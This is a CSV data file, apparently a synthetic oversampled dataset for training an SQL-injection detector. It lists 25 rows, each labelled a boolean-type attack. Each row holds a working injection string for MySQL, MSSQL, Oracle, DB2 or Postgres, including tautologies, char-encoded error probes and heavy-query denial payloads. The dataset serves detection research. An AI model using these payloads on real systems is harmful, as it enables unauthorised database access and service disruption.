SMOTE_000476,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,0.2662995092524805
SMOTE_000477,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,1.5417350793533624
SMOTE_000478,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,1.539696913810236
SMOTE_000479,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.3589947495587937
SMOTE_000480,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R000078,0.3922422177017576
SMOTE_000481,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000002,1.8779590448466117
SMOTE_000482,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000048,4.839375954079873e-05
SMOTE_000483,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.8283748963969435
SMOTE_000484,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.9799304589179093
SMOTE_000485,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,1.4565306805628455
SMOTE_000486,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.607876243733954
SMOTE_000487,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,0.33586471178926763
SMOTE_000488,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000066,1.419510963232366
SMOTE_000489,attack,boolean,"1""   )    )    as ltco where 3862  =  3862 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000009,1.0573183721554253
SMOTE_000490,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,0.97200796656506
SMOTE_000491,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,1.0877977486947101
SMOTE_000492,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,0.32953240096312736
SMOTE_000493,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.5230225342146033
SMOTE_000494,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,0.8443761171324335
SMOTE_000495,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.4175928722054914
SMOTE_000496,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000018,1.1660480177724435
SMOTE_000497,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.49408122639206986
SMOTE_000498,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000058,1.9288961422900681
SMOTE_000499,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000010,0.45956770361824384
SMOTE_000500,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.1096957878947956
